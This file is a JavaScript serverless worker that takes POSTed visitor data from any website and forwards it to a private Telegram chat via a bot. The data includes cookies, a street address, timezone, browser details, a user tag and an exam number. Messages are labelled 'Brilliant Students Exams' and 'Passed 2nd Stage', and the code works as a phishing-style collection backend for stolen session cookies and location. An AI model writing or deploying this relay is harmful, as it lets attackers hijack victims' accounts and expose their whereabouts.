export default {
  async fetch(request, env) {
    if (request.method === 'OPTIONS') {
      return new Response(null, {
        status: 204,
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'POST, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type',
        },
      });
    }

    if (request.method !== 'POST') {
      return new Response('Only POST allowed', {
        status: 405,
        headers: { 'Access-Control-Allow-Origin': '*' },
      });
    }

    let data;
    try {
      data = await request.json();
    } catch {
      return new Response('Invalid JSON', {
        status: 400,
        headers: { 'Access-Control-Allow-Origin': '*' },
      });
    }

    const { userTag, examNumber, geoInfo, browserInfo, cookies } = data;

    if (!userTag || !examNumber) {
      return new Response('Missing userTag or examNumber', {
        status: 400,
        headers: { 'Access-Control-Allow-Origin': '*' },
      });
    }

    const BOT_TOKEN = env.BOT_TOKEN;
    const CHAT_ID = env.CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
      return new Response('Environment variables not set', {
        status: 500,
        headers: { 'Access-Control-Allow-Origin': '*' },
      });
    }

    // Escape special MarkdownV2 characters
    const escapeMarkdown = (text = '') => {
      return text
        .toString()
        .replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, '\\$1');
    };

    const message =
      `📘 *Brilliant Students Exams*\n` +
      `🏷️ Tag: ${escapeMarkdown(userTag)}\n` +
      `📨 Exam Number: ${escapeMarkdown(examNumber)}\n` +
      `🌍 Country: ${escapeMarkdown(geoInfo?.country || 'Unknown')}\n` +
      `📍 Address: ${escapeMarkdown(geoInfo?.address || 'Unknown')}\n` +
      `⏰ Timezone: ${escapeMarkdown(geoInfo?.timezone || 'Unknown')}\n` +
      `🖥️ Browser: ${escapeMarkdown(browserInfo?.name || 'Unknown')} v${escapeMarkdown(browserInfo?.version || '')}\n` +
      `🍪 Cookies: ${escapeMarkdown(cookies || 'None')}\n` +
      `✔️ Passed 2nd Stage`;

    try {
      const telegramRes = await fetch(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'MarkdownV2',
          }),
        }
      );

      const telegramData = await telegramRes.json();

      const response = telegramData.ok
        ? { success: true }
        : { error: 'Telegram API error', details: telegramData };

      return new Response(JSON.stringify(response), {
        status: telegramData.ok ? 200 : 502,
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Content-Type': 'application/json',
        },
      });
    } catch (err) {
      return new Response(
        JSON.stringify({ error: 'Fetch to Telegram failed', details: err.message }),
        {
          status: 502,
          headers: {
            'Access-Control-Allow-Origin': '*',
            'Content-Type': 'application/json',
          },
        }
      );
    }
  },
};
